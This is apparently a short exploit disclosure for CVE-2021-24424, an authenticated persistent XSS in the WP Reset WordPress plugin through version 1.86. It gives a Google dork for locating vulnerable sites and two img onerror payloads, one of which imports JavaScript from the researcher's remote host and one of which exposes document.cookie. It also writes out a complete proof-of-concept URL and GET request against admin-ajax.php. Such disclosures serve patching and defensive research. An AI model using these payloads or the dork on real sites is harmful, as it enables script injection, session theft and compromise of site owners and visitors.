/*!
- # VULNERABILITY: WP Reset WordPress Plugin <= 1.86 - Authenticated Persistent XSS
- # GOOGLE DORK: inurl:/wp-content/plugins/wp-reset/
- # DATE: 2021-05-26
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: WebFactory Ltd [ https://www.webfactoryltd.com ]
- # SOFTWARE VERSION: <= 1.86
- # SOFTWARE LINK: https://wordpress.org/plugins/wp-reset/
- # CVSS: 3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N
- # CWE: CWE-79
- # CVE: CVE-2021-24424
*/



### -- [ Info: ]

[i] An Authenticated Persistent XSS vulnerability was discovered in the WP Reset plugin through v1.86 for WordPress.

[i] Vulnerable parameter(s): &extra_data=.



### -- [ Impact: ]

[~] Malicious JavaScript code injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] <img src=x onerror=;import(`//m0ze.ru/payload/a.js`); //>

[$] <img src=x onerror=alert(document.cookie); //>



### -- [ PoC | Authenticated Persistent XSS | Enter snapshot name or brief description: ]

[!] https://example.com/wp-admin/admin-ajax.php?action=wp_reset_run_tool&_ajax_nonce=394f497fd0&tool=create_snapshot&extra_data=%3Cimg%20src%3Dx%20onerror%3D%3Bimport(%60%2F%2Fm0ze.ru%2Fpayload%2Fa.js%60)%3B%20%2F%2F%3E

[!] GET /wp-admin/admin-ajax.php?action=wp_reset_run_tool&_ajax_nonce=394f497fd0&tool=create_snapshot&extra_data=%3Cimg%20src%3Dx%20onerror%3D%3Bimport(%60%2F%2Fm0ze.ru%2Fpayload%2Fa.js%60)%3B%20%2F%2F%3E HTTP/2
Host: example.com



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
